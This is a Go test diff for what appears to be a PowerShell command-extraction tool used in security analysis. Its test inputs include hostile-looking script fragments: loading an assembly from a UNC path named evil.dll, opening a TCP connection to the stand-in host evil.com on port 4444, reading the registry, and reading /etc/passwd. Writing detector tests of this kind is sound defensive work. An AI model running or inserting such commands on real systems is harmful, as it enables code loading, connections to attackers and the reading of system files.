@@ -1412,6 +1412,234 @@ func TestPSWorker_VarCommandName(t *testing.T) {
 	}
 }
 
+// TestPSWorker_AssemblyLoad_UNCPath extends the assembly load tests with a UNC
+// path argument to verify that backslash-heavy network paths are preserved
+// correctly by the pwsh worker. BUG 4: requires system.reflection.assembly::loadfrom
+// in the commandDB so OpExecute is produced downstream.
+func TestPSWorker_AssemblyLoad_UNCPath(t *testing.T) {
+	pwshPath, ok := FindPwsh()
+	if !ok {
+		t.Skip("pwsh.exe / powershell.exe not found")
+	}
+	w, err := newPwshWorker(pwshPath)
+	if err != nil {
+		t.Fatalf("newPwshWorker: %v", err)
+	}
+	defer w.stop()
+
+	// UNC path: the pwsh worker must preserve the leading \\ without mangling.
+	// requires BUG4 fix: system.reflection.assembly::loadfrom in commandDB.
+	const script = `[System.Reflection.Assembly]::LoadFrom("\\server\share\evil.dll")`
+	const wantName = "system.reflection.assembly::loadfrom"
+	const wantArg = `\\server\share\evil.dll`
+
+	resp, err := w.parse(script)
+	if err != nil {
+		t.Fatalf("parse: %v", err)
+	}
+	if len(resp.ParseErrors) > 0 {
+		t.Fatalf("unexpected parse errors: %v", resp.ParseErrors)
+	}
+	var found bool
+	for _, c := range resp.Commands {
+		if c.Name == wantName && slices.Contains(c.Args, wantArg) {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected %s with arg %q; got: %+v", wantName, wantArg, resp.Commands)
+	}
+}
+
+// TestPSWorker_TcpClientConnect verifies that $tcp.Connect("evil.com", 4444)
+// is extracted as "system.net.sockets.tcpclient::connect" with the hostname arg.
+// BUG 4: requires the commandDB entry for system.net.sockets.tcpclient::connect.
+func TestPSWorker_TcpClientConnect(t *testing.T) {
+	pwshPath, ok := FindPwsh()
+	if !ok {
+		t.Skip("pwsh.exe / powershell.exe not found")
+	}
+	w, err := newPwshWorker(pwshPath)
+	if err != nil {
+		t.Fatalf("newPwshWorker: %v", err)
+	}
+	defer w.stop()
+
+	// requires BUG4 fix: system.net.sockets.tcpclient::connect in commandDB
+	const script = `$tcp = New-Object System.Net.Sockets.TcpClient
+$tcp.Connect("evil.com", 4444)`
+	resp, err := w.parse(script)
+	if err != nil {
+		t.Fatalf("parse: %v", err)
+	}
+	if len(resp.ParseErrors) > 0 {
+		t.Fatalf("unexpected parse errors: %v", resp.ParseErrors)
+	}
+
+	const wantName = "system.net.sockets.tcpclient::connect"
+	const wantArg = "evil.com"
+	var found bool
+	for _, c := range resp.Commands {
+		if c.Name == wantName && slices.Contains(c.Args, wantArg) {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected %s with arg %q; got: %+v", wantName, wantArg, resp.Commands)
+	}
+}
+
+// TestPSWorker_RegistryAccess verifies that [Microsoft.Win32.Registry]::GetValue
+// is extracted as "microsoft.win32.registry::getvalue" with the registry path arg.
+// BUG 4: requires commandDB entry for microsoft.win32.registry::getvalue.
+func TestPSWorker_RegistryAccess(t *testing.T) {
+	pwshPath, ok := FindPwsh()
+	if !ok {
+		t.Skip("pwsh.exe / powershell.exe not found")
+	}
+	w, err := newPwshWorker(pwshPath)
+	if err != nil {
+		t.Fatalf("newPwshWorker: %v", err)
+	}
+	defer w.stop()
+
+	// requires BUG4 fix: microsoft.win32.registry::getvalue in commandDB
+	const script = `[Microsoft.Win32.Registry]::GetValue("HKEY_LOCAL_MACHINE\SOFTWARE", "key", $null)`
+	resp, err := w.parse(script)
+	if err != nil {
+		t.Fatalf("parse: %v", err)
+	}
+	if len(resp.ParseErrors) > 0 {
+		t.Fatalf("unexpected parse errors: %v", resp.ParseErrors)
+	}
+
+	const wantName = "microsoft.win32.registry::getvalue"
+	const wantArg = `HKEY_LOCAL_MACHINE\SOFTWARE`
+	var found bool
+	for _, c := range resp.Commands {
+		if c.Name == wantName && slices.Contains(c.Args, wantArg) {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("expected %s with arg %q; got: %+v", wantName, wantArg, resp.Commands)
+	}
+}
+
+// TestPSWorker_StaticMethod_VarArg verifies three cases for BUG 10:
+// static method variable-argument handling and has_subst propagation.
+//
+// Case 1: $path = "/etc/passwd" (literal assignment) then [File]::ReadAllText($path)
+//   - args should contain "/etc/passwd" (resolved from $path)
+//   - HasSubst should be false (the variable's value is a literal string)
+//
+// Case 2: $path = Get-Clipboard (cmdlet — unresolvable) then [File]::ReadAllText($path)
+//   - args should be empty (cannot resolve cmdlet result at parse time)
+//   - HasSubst should be true (variable holds non-literal value)
+//
+// Case 3: [File]::ReadAllText("/etc/passwd") (baseline — direct literal arg)
+//   - args should contain "/etc/passwd"
+//   - HasSubst should be false
+func TestPSWorker_StaticMethod_VarArg(t *testing.T) {
+	pwshPath, ok := FindPwsh()
+	if !ok {
+		t.Skip("pwsh.exe / powershell.exe not found")
+	}
+	w, err := newPwshWorker(pwshPath)
+	if err != nil {
+		t.Fatalf("newPwshWorker: %v", err)
+	}
+	defer w.stop()
+
+	const wantName = "system.io.file::readalltext"
+
+	t.Run("literal-assigned var resolves and has_subst=false", func(t *testing.T) {
+		// BUG 10: variable arg to static method; $path is a string literal assignment.
+		// After fix: arg resolved to "/etc/passwd", has_subst=false.
+		const script = `$path = "/etc/passwd"
+[System.IO.File]::ReadAllText($path)`
+		resp, err := w.parse(script)
+		if err != nil {
+			t.Fatalf("parse: %v", err)
+		}
+		if len(resp.ParseErrors) > 0 {
+			t.Fatalf("unexpected parse errors: %v", resp.ParseErrors)
+		}
+		var found bool
+		for _, c := range resp.Commands {
+			if c.Name == wantName {
+				found = true
+				if !slices.Contains(c.Args, "/etc/passwd") {
+					t.Errorf("expected arg %q in %v (variable should be resolved from literal assignment)", "/etc/passwd", c.Args)
+				}
+				if c.HasSubst {
+					t.Errorf("has_subst=true, want false (variable holds a literal string)")
+				}
+			}
+		}
+		if !found {
+			t.Errorf("expected command %q; got: %+v", wantName, resp.Commands)
+		}
+	})
+
+	t.Run("cmdlet-assigned var yields empty args and has_subst=true", func(t *testing.T) {
+		// BUG 10: $path comes from a cmdlet (unresolvable at parse time).
+		// After fix: args empty, has_subst=true.
+		const script = `$path = Get-Clipboard
+[System.IO.File]::ReadAllText($path)`
+		resp, err := w.parse(script)
+		if err != nil {
+			t.Fatalf("parse: %v", err)
+		}
+		if len(resp.ParseErrors) > 0 {
+			t.Fatalf("unexpected parse errors: %v", resp.ParseErrors)
+		}
+		var found bool
+		for _, c := range resp.Commands {
+			if c.Name == wantName {
+				found = true
+				if !c.HasSubst {
+					t.Errorf("has_subst=false, want true (variable comes from cmdlet — unresolvable)")
+				}
+				// args should be empty: the unresolvable variable produces no literal
+				for _, arg := range c.Args {
+					t.Errorf("unexpected arg %q — unresolvable variable should yield no args", arg)
+				}
+			}
+		}
+		if !found {
+			t.Errorf("expected command %q; got: %+v", wantName, resp.Commands)
+		}
+	})
+
+	t.Run("direct literal arg baseline", func(t *testing.T) {
+		// Baseline: direct literal argument — args=["/etc/passwd"], has_subst=false.
+		const script = `[System.IO.File]::ReadAllText("/etc/passwd")`
+		resp, err := w.parse(script)
+		if err != nil {
+			t.Fatalf("parse: %v", err)
+		}
+		if len(resp.ParseErrors) > 0 {
+			t.Fatalf("unexpected parse errors: %v", resp.ParseErrors)
+		}
+		var found bool
+		for _, c := range resp.Commands {
+			if c.Name == wantName {
+				found = true
+				if !slices.Contains(c.Args, "/etc/passwd") {
+					t.Errorf("expected arg %q in %v", "/etc/passwd", c.Args)
+				}
+				if c.HasSubst {
+					t.Errorf("has_subst=true, want false for direct literal arg")
+				}
+			}
+		}
+		if !found {
+			t.Errorf("expected command %q; got: %+v", wantName, resp.Commands)
+		}
+	})
+}
+
 // =============================================================================
 // Fuzz tests (FuzzPSWorker_*, FuzzExtractor_*)
 // =============================================================================
